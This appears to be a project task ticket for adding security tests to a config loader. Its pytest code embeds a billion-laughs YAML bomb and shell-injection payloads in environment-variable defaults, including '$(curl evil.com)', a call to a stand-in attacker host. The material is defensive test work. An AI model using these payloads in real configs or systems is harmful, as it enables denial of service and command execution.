# Task: test-security-config-bombs - YAML Bomb & Config Injection Tests

**Priority:** CRITICAL
**Effort:** 1-2 days
**Status:** pending
**Owner:** unassigned

---

## Summary
Add tests to prevent YAML bombs (billion laughs attack), environment variable injection, and config size limits.

---

## Files to Create
- `tests/test_security/test_config_injection.py` - New test file for config attack vectors

---

## Files to Modify
- `src/compiler/config_loader.py` - Add protections against YAML bombs and injection

---

## Acceptance Criteria

### Security Controls
- [ ] Test YAML bomb (billion laughs) detection
- [ ] Test environment variable injection (shell metacharacters in defaults)
- [ ] Test config file size limits (10MB boundary)
- [ ] Test excessive nesting depth (>50 levels)
- [ ] Test circular references in YAML
- [ ] Test malicious anchors and aliases

### Testing
- [ ] All 6 config attack tests implemented
- [ ] Tests verify attacks are blocked
- [ ] Tests verify size limits enforced
- [ ] Error messages are safe (no code execution)

### Protection
- [ ] YAML parser has depth limit
- [ ] File size check happens before parsing
- [ ] Environment variable expansion is sanitized
- [ ] Reference count limits prevent bombs

---

## Implementation Details

```python
# tests/test_security/test_config_injection.py

import pytest
from src.compiler.config_loader import load_config, ConfigSecurityError

class TestConfigInjectionAttacks:
    """Test configuration injection and DoS attacks."""
    
    def test_yaml_bomb_billion_laughs(self, tmp_path):
        """Test YAML bomb (billion laughs) is rejected."""
        bomb_yaml = """
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
"""
        config_file = tmp_path / "bomb.yaml"
        config_file.write_text(bomb_yaml)
        
        with pytest.raises(ConfigSecurityError, match="excessive references"):
            load_config(str(config_file))
    
    def test_env_var_shell_injection(self, tmp_path, monkeypatch):
        """Test shell injection in environment variable defaults."""
        malicious_yaml = """
agent:
  name: "${USER:$(whoami)}"
  model: "${MODEL:-$(curl evil.com)}"
"""
        config_file = tmp_path / "malicious.yaml"
        config_file.write_text(malicious_yaml)
        
        # Should reject shell metacharacters in defaults
        with pytest.raises(ConfigSecurityError, match="shell metacharacters"):
            load_config(str(config_file))
    
    def test_config_size_limit(self, tmp_path):
        """Test config file size limit enforcement."""
        # Create 11MB config file
        large_config = "key: " + "x" * (11 * 1024 * 1024)
        config_file = tmp_path / "large.yaml"
        config_file.write_text(large_config)
        
        with pytest.raises(ConfigSecurityError, match="exceeds size limit"):
            load_config(str(config_file))
    
    def test_excessive_nesting_depth(self, tmp_path):
        """Test deeply nested config is rejected."""
        # Create 100-level nested structure
        nested = "a:\n"
        for i in range(100):
            nested += "  " * i + "b:\n"
        
        config_file = tmp_path / "nested.yaml"
        config_file.write_text(nested)
        
        with pytest.raises(ConfigSecurityError, match="nesting depth"):
            load_config(str(config_file))
    
    def test_circular_reference_detection(self, tmp_path):
        """Test circular references are detected."""
        circular_yaml = """
a: &a
  b: *a
"""
        config_file = tmp_path / "circular.yaml"
        config_file.write_text(circular_yaml)
        
        with pytest.raises(ConfigSecurityError, match="circular"):
            load_config(str(config_file))
```

---

## Test Strategy

```bash
# Run config security tests
pytest tests/test_security/test_config_injection.py -v

# Test with large files
pytest tests/test_security/test_config_injection.py::test_config_size_limit -v

# Check protection coverage
pytest tests/test_security/ --cov=src/compiler/config_loader
```

---

## Success Metrics
- [ ] All 6 config attack tests implemented and passing
- [ ] YAML parser safely handles malicious configs
- [ ] Size limits prevent DoS attacks
- [ ] Coverage >90% for config security paths

---

## Dependencies
- **Blocked by:** test-fix-failures-01
- **Blocks:** None
- **Integrates with:** src/compiler/config_loader.py

---

## Design References
- QA Engineer Report: Test Case #6-9 (Critical config injection)
- YAML Bomb: https://en.wikipedia.org/wiki/Billion_laughs_attack

---

## Notes
- Use safe YAML loader (yaml.safe_load)
- Consider using pyyaml with custom constructor
- Add timeout to YAML parsing
